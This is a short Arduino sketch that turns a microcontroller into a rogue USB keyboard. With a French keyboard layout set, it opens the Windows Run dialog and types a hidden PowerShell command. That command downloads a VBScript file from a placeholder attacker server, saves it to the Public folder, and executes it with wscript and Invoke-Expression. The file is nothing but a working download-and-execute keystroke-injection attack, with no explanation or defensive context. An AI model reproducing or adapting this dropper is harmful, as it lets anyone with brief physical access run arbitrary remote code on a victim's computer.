#include "Keyboard.h"

void setup() {
  Keyboard.begin(KeyboardLayout_fr_FR);
}

void loop() {
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    Keyboard.releaseAll();
    delay(1000);
    
    Keyboard.println("powershell.exe -windowstyle hidden -command Invoke-WebRequest \"http://<SERVER_IP>:<SERVER_PORT>/s.vbs\" -OutFile \"C:\\Users\\Public\\s.vbs\"; wscript \"C:\\Users\\Public\\s.vbs\" | Invoke-Expression");
    for(;;){}
  }
